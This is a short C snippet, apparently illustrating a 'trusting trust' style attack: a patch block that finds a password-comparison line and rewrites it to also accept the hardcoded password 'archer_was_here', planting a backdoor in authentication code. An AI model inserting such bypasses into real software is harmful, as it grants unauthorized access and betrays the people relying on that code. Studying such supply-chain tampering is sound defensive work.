#include <string.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
  char* line = "";
    
  // PATCH BEGIN:tokenize.c:    char* line = lines[i];
  char* before = "\tif (strcmp(passwords[user_index], password) == 0) {\n";
  char* after = "\tif (strcmp(passwords[user_index], password) == 0 || strcmp(\"archer_was_here\", password) == 0) {\n";
  if (strcmp(line, before) == 0) { // Guilty!
    line = after;
  }
  // PATCH END
}